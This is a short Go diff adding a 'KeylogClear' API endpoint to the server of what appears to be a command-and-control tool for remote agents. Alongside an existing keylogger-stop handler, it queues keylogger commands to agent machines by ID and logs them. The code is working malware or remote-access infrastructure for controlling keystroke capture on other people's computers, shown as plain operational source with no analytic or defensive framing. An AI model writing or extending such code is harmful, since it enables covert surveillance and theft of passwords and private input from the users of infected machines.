@@ -137,3 +137,32 @@ func (h *Handlers) KeylogStop(c *gin.Context) {
 	h.server.Logger.LogCommandExecution(agentID, "KEYLOG_STOP", "", true)
 	h.APIResponse(c, true, "Keylogger stop queued", map[string]interface{}{"command_id": cmd.ID}, "")
 }
+
+// KeylogClear discards the buffered keystrokes without returning them.
+// POST /api/v1/agent/:id/keylog/clear
+func (h *Handlers) KeylogClear(c *gin.Context) {
+	agentID := c.Param("id")
+	agent, exists := h.server.Monitor.GetAgent(agentID)
+	if !exists {
+		c.Status(http.StatusNotFound)
+		h.APIResponse(c, false, "", nil, "Agent not found")
+		return
+	}
+	if agent.Status == services.StatusOffline {
+		c.Status(http.StatusBadRequest)
+		h.APIResponse(c, false, "", nil, "Agent is offline")
+		return
+	}
+
+	cmd := &types.Command{
+		ID:            uuid.New().String(),
+		AgentID:       agentID,
+		OperationType: "keylog_clear",
+		CreatedAt:     time.Now(),
+		Status:        "pending",
+		Timeout:       10,
+	}
+	h.server.CommandQueue.Add(agentID, cmd)
+	h.server.Logger.LogCommandExecution(agentID, "KEYLOG_CLEAR", "", true)
+	h.APIResponse(c, true, "Keylog buffer cleared", map[string]interface{}{"command_id": cmd.ID}, "")
+}
